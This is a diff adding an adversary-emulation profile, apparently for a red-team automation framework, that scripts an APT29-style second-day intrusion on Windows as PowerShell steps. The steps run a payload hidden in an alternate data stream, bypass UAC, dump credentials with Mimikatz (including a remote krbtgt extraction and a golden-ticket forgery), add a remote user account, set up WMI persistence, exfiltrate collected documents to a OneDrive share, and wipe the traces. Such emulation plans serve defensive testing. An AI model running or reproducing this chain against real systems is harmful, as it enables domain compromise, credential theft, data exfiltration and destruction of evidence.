@@ -1,0 +1,499 @@
+id: b7a9eb99-1cdb-48ae-962f-a6ca41bc843d
+name: APT29-day2
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- e506f811-884d-4992-aacb-514b33a0324f
+- 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278
+- f9c0b150-822f-497b-ad6d-187f24561e9a
+- 2b5a72b1-01e4-48ae-98b0-2570a7894371
+- 0cfadbcb-ec21-44ae-adb7-9a23176dd620
+- 96140694-6d13-40b6-9553-0e63533469f3
+- f320eebd-e75b-4194-b529-79e64ad0b9ee
+- a34ab8f2-a106-41fb-af0b-cf5382bd18ae
+- 5226e5dc-fc28-43b7-a679-0db49d520402
+- 4ef6009d-2d62-4bb4-8de9-0458df2e9567
+- 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24
+- 43aad2d6-d16a-4adb-aa2b-9510a3be4c52
+- 1c8552c7-f7ed-4523-b640-72d65af5f855
+- a42be479-fc26-4d7c-9e63-7a9b74e4c8d2
+- acecc8f7-18c2-41fd-87bc-39ffd644e4e9
+- b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c
+- fc231955-774f-442c-ac0e-e74dfda50c5c
+- 4840d6dd-da13-401a-be46-05db56f4e1e0
+- f820b93d-6176-4a72-a138-a70b0b549c49
+- 267bad86-3f06-49f1-9a3e-6522f2a61e7a
+- afb8d8f7-d059-4825-95ae-c5727e2db320
+abilities:
+ e506f811-884d-4992-aacb-514b33a0324f:
+  name:  Click .LNK payload
+  tactic:  execution
+  technique_name:  "User Execution: Malicious File"
+  technique_id:  T1204.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
+       
+       if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
+         Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+         Write-Host "Removed old kxwn.lock file";
+       }
+       
+       powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+   - pwsh:
+     platform: windows
+     command: |
+       Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
+       
+       if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
+         Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+         Write-Host "Removed old kxwn.lock file";
+       }
+       
+       powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+ 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278:
+  name:  Timestomp kxwn.lock
+  tactic:  defensive-evasion
+  technique_name:  "Indicator Removal on Host: Timestomp"
+  technique_id:  T1070.006
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
+         write-host "[!] kxwn.lock was not found on this host.";
+         exit 1;
+       } else {
+         . .\timestomp.ps1;
+         timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
+         write-host "[!] kxwn.lock was not found on this host.";
+         exit 1;
+       } else {
+         . .\timestomp.ps1;
+         timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
+       }
+ f9c0b150-822f-497b-ad6d-187f24561e9a:
+  name:  Detect Anti-Virus
+  tactic:  discovery
+  technique_name:  "Software Discovery: Security Software Discovery"
+  technique_id:  T1518.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepTwelve.ps1;
+       detectav
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepTwelve.ps1;
+       detectav
+ 2b5a72b1-01e4-48ae-98b0-2570a7894371:
+  name:  Detect Software
+  tactic:  discovery
+  technique_name:  "Software Discovery"
+  technique_id:  T1518
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepTwelve.ps1;
+       software;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepTwelve.ps1;
+       software;
+ 0cfadbcb-ec21-44ae-adb7-9a23176dd620:
+  name:  Enumerate Computer Name
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       comp;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       comp;
+ 96140694-6d13-40b6-9553-0e63533469f3:
+  name:  Enumerate Domain Name
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       domain;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       domain;
+ f320eebd-e75b-4194-b529-79e64ad0b9ee:
+  name:  Enumerate Username
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       user;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       user;
+ a34ab8f2-a106-41fb-af0b-cf5382bd18ae:
+  name:  Enumerate Processes
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       pslist;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepThirteen.ps1;
+       pslist;
+ 5226e5dc-fc28-43b7-a679-0db49d520402:
+  name:  UAC Bypass via sdctl
+  tactic:  defensive-evasion
+  technique_name:  "Access Token Manipulation: Create Process with Token"
+  technique_id:  T1134.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepFourteen_bypassUAC.ps1;
+       bypass;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepFourteen_bypassUAC.ps1;
+       bypass;
+ 4ef6009d-2d62-4bb4-8de9-0458df2e9567:
+  name:  Credential Dumping
+  tactic:  credential-access
+  technique_name:  "Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepFourteen_credDump.ps1;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepFourteen_credDump.ps1;
+ 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24:
+  name:  Stage Mimikatz Binary
+  tactic:  credential-access
+  technique_name:  "Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       write-host "[+] Successfully downloaded m.exe";
+   - pwsh:
+     platform: windows
+     command: |
+       write-host "[+] Successfully downloaded m.exe";
+ 43aad2d6-d16a-4adb-aa2b-9510a3be4c52:
+  name:  WMI Persistence technique
+  tactic:  persistence
+  technique_name:  "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
+  technique_id:  T1546.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
+       if ($?) {
+         write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
+         exit 1;
+       } else {
+         . .\stepFifteen_wmi.ps1;
+         wmi;
+         if ($?) {
+           write-host "[+] WMI script has successfully executed!";
+           exit 0;
+         }
+         exit 1;
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
+       if ($?) {
+         write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
+         exit 1;
+       } else {
+         . .\stepFifteen_wmi.ps1;
+         wmi;
+         if ($?) {
+           write-host "[+] WMI script has successfully executed!";
+           exit 0;
+         }
+         exit 1;
+       }
+ 1c8552c7-f7ed-4523-b640-72d65af5f855:
+  name:  Enumerate Domain Controller
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\powerview.ps1;
+       get-netdomaincontroller;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\powerview.ps1;
+       get-netdomaincontroller;
+ a42be479-fc26-4d7c-9e63-7a9b74e4c8d2:
+  name:  Enumerate Domain SID
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepSixteen_SID.ps1;
+       siduser;
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepSixteen_SID.ps1;
+       siduser;
+ acecc8f7-18c2-41fd-87bc-39ffd644e4e9:
+  name:  Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping
+  tactic:  lateral-movement
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\invoke-winrmsession.ps1;
+       $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
+       Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
+       if ($?) {
+         write-host "[+] Successfully copied m.exe to remote host";
+       } else {
+         write-host "[!] Error, copying and executing m.exe on remote host";
+       }
+       Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
+   - pwsh:
+     platform: windows
+     command: |
+       . .\invoke-winrmsession.ps1;
+       $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
+       Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
+       if ($?) {
+         write-host "[+] Successfully copied m.exe to remote host";
+       } else {
+         write-host "[!] Error, copying and executing m.exe on remote host";
+       }
+       Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
+ b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c:
+  name:  Collect E-mails
+  tactic:  collection
+  technique_name:  "Email Collection: Local Email Collection"
+  technique_id:  T1114.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\stepSeventeen_email.ps1;
+       Write-Host "Emails Collected";
+   - pwsh:
+     platform: windows
+     command: |
+       . .\stepSeventeen_email.ps1;
+       Write-Host "Emails Collected";
+ fc231955-774f-442c-ac0e-e74dfda50c5c:
+  name:  Collect Files & Compress Collection
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       try{
+         if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
+           New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
+         }
+       } catch {
+         write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
+         exit 1;
+       }
+       
+       if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
+         write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
+         exit 1;
+       }
+       Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
+       . .\stepSeventeen_zip.ps1;
+       zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+       if ($?) {
+         write-host "[+] Documents successfully staged for collection.";
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       try{
+         if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
+           New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
+         }
+       } catch {
+         write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
+         exit 1;
+       }
+       
+       if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
+         write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
+         exit 1;
+       }
+       Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
+       . .\stepSeventeen_zip.ps1;
+       zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+       if ($?) {
+         write-host "[+] Documents successfully staged for collection.";
+       }
+ 4840d6dd-da13-401a-be46-05db56f4e1e0:
+  name:  Exfiltrate data to OneDrive
+  tactic:  exfiltration
+  technique_name:  "Transfer Data to Cloud Account"
+  technique_id:  T1537
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
+       if($err -Like "*System error 85*") {
+         Write-Host "OneDrive net drive is already mounted!";
+       } elseif($err -Like "*System error 67*") {
+         Write-Host "OneDrive net drive mount failed - Check URL!";
+         Write-Host "#{onedrive.url}";
+         exit 1;
+       } elseif($err -Like "*System error 1244*") {
+         Write-Host "Could not authenticate to OneDrive - Check Creds!";
+         Write-Host "User: #{onedrive.username}";
+         Write-Host "Password: #{onedrive.password}";
+         exit 1;
+       }
+       
+       Write-Host "Mount Successful"
+       Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
+       if(!$?){
+         exit 1;
+       }
+       
+       Write-Host "Copy Successfull"
+       exit 0;
+   - pwsh:
+     platform: windows
+     command: |
+       $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
+       if($err -Like "*System error 85*") {
+         Write-Host "OneDrive net drive is already mounted!";
+       } elseif($err -Like "*System error 67*") {
+         Write-Host "OneDrive net drive mount failed - Check URL!";
+         Write-Host "#{onedrive.url}";
+         exit 1;
+       } elseif($err -Like "*System error 1244*") {
+         Write-Host "Could not authenticate to OneDrive - Check Creds!";
+         Write-Host "User: #{onedrive.username}";
+         Write-Host "Password: #{onedrive.password}";
+         exit 1;
+       }
+       
+       Write-Host "Mount Successful"
+       Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
+       if(!$?){
+         exit 1;
+       }
+       
+       Write-Host "Copy Successfull"
+       exit 0;
+ f820b93d-6176-4a72-a138-a70b0b549c49:
+  name:  Data Wiping of staged files
+  tactic:  impact
+  technique_name:  "Disk Wipe: Disk Content Wipe"
+  technique_id:  T1561.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       . .\wipe.ps1;
+       wipe "m.exe";
+       wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
+       wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";
+   - pwsh:
+     platform: windows
+     command: |
+       . .\wipe.ps1;
+       wipe "m.exe";
+       wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
+       wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";
+ 267bad86-3f06-49f1-9a3e-6522f2a61e7a:
+  name:  Execute Invoke-Mimikatz
+  tactic:  credential-access
+  technique_name:  "Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       klist purge;
+       . .\Invoke-Mimikatz.ps1;
+       invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
+       klist;
+       invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
+   - pwsh:
+     platform: windows
+     command: |
+       klist purge;
+       . .\Invoke-Mimikatz.ps1;
+       invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
+       klist;
+       invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
+ afb8d8f7-d059-4825-95ae-c5727e2db320:
+  name:  Triggering Persistent
+  tactic:  persistence
+  technique_name:  "Signed Binary Proxy Execution: Rundll32"
+  technique_id:  T1218.011
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Restart-Computer -Force;
+   - pwsh:
+     platform: windows
+     command: |
+       Restart-Computer -Force;
